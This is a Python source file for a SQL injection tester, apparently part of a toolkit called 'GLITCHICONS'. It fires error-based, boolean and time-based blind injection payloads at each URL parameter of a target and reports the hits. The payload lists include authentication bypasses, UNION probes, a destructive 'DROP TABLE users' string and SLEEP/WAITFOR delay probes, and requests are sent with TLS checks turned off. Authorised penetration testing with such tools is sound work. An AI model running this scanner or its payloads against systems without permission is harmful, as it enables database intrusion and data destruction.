"""
GLITCHICONS ⬡ — SQLi Tester v1.0
Tests: error-based, boolean-based, time-based blind SQLi
"""
import requests
import sys
import time
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

ERROR_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    "' OR 1=1#", "admin'--", "' UNION SELECT NULL--",
    "1; DROP TABLE users--", "' AND 1=2--",
    "' AND SLEEP(3)--", "1 OR SLEEP(3)--",
]

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-",
    "postgresql", "sqlite", "syntax error",
    "unclosed quotation", "microsoft ole db",
    "odbc drivers", "warning: mysql",
    "supplied argument is not a valid mysql",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", 3),
    ("' OR SLEEP(3)--", 3),
    ("1; WAITFOR DELAY '0:0:3'--", 3),
    ("' OR pg_sleep(3)--", 3),
]

def test_error_based(url, params=None, cookies=None, delay=0.5):
    """Test error-based SQLi."""
    console.print(f"\n[bold]→ Error-Based SQLi[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    findings = []
    from urllib.parse import urlparse, parse_qs
    parsed   = urlparse(url)
    if not params:
        params   = {k: v[0] for k, v in
                    parse_qs(parsed.query).items()}
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    else:
        base_url = url

    if not params:
        console.print("  [dim]No parameters to test[/dim]")
        return findings

    for param in params:
        for payload in ERROR_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                r = session.get(
                    base_url, params=test_params,
                    timeout=10, verify=False
                )
                resp_lower = r.text.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in resp_lower:
                        console.print(
                            f"  [red]⚠ SQLi ERROR: param={param} "
                            f"sig='{sig}'[/red]"
                        )
                        findings.append({
                            "type"     : "SQLI_ERROR",
                            "param"    : param,
                            "payload"  : payload,
                            "signature": sig,
                            "url"      : r.url,
                        })
                        break
                time.sleep(delay)
            except Exception:
                continue

    if not findings:
        console.print("  [green]No error-based SQLi found[/green]")
    return findings


def test_time_based(url, params=None, cookies=None):
    """Test time-based blind SQLi."""
    console.print(f"\n[bold]→ Time-Based Blind SQLi[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    findings = []
    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(url)
    if not params:
        params   = {k: v[0] for k, v in
                    parse_qs(parsed.query).items()}
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    else:
        base_url = url

    # Baseline timing
    try:
        t0 = time.time()
        session.get(base_url, params=params,
                    timeout=15, verify=False)
        baseline = time.time() - t0
    except Exception:
        baseline = 1.0

    for param in list(params.keys())[:3]:
        for payload, expected_delay in TIME_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                t0 = time.time()
                session.get(
                    base_url, params=test_params,
                    timeout=15, verify=False
                )
                elapsed = time.time() - t0

                if elapsed > baseline + expected_delay - 0.5:
                    console.print(
                        f"  [red]⚠ TIME-BASED SQLi: param={param} "
                        f"delay={elapsed:.1f}s[/red]"
                    )
                    findings.append({
                        "type"   : "SQLI_TIME_BASED",
                        "param"  : param,
                        "payload": payload,
                        "delay"  : elapsed,
                    })
            except Exception:
                continue

    if not findings:
        console.print("  [green]No time-based SQLi found[/green]")
    return findings


def run(url, params=None, cookies=None, output_dir=None):
    """Run full SQLi test suite."""
    console.print(Panel(
        "[bold purple]⬡ GLITCHICONS SQLi TESTER[/bold purple]\n"
        f"[dim]Target: {url}[/dim]",
        border_style="purple"
    ))
    import warnings
    warnings.filterwarnings("ignore")

    findings  = test_error_based(url, params, cookies)
    findings += test_time_based(url, params, cookies)

    if output_dir and findings:
        import json
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        f   = out / f"sqli_findings_{ts}.json"
        f.write_text(json.dumps(findings, indent=2))
        console.print(f"\nReport: {f}")

    console.print(f"\n[bold]Total: {len(findings)} SQLi findings[/bold]")
    return findings


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else
        "https://target.example.com")
